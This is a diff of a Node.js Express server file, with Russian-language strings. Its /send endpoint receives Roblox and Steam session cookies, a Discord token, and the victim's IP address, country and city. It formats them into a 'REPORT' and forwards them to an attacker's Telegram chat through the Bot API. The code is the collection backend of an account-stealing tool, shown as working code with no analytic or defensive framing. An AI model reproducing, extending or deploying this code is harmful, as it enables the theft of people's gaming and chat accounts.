@@ -1,8 +1,8 @@
-// server.js — правильные статусы
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 const app = express();
+
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
@@ -12,10 +12,10 @@ const API = "https://api.telegram.org/bot" + TOKEN;
 
 app.post('/send', async (req, res) => {
   try {
-    const { 
-      robloxCookie, steamCookie, discordToken, 
+    const {
+      robloxCookie, steamCookie, discordToken,
       robloxStatus, steamStatus, discordStatus,
-      ip, country, city 
+      ip, country, city
     } = req.body;
 
     let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n━━━━━━━━━━━━━━━━━━\n\n";
@@ -43,7 +43,12 @@ app.post('/send', async (req, res) => {
 
     msg += "━━━━━━━━━━━━━━━━━━\n⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
 
-    await axios.post(API + "/sendMessage", { chat_id: CHAT_ID, text: msg, parse_mode: "HTML" });
+    await axios.post(API + "/sendMessage", {
+      chat_id: CHAT_ID,
+      text: msg,
+      parse_mode: "HTML"
+    });
+
     res.json({ ok: true });
   } catch (e) {
     res.status(500).json({ ok: false, error: e.message });
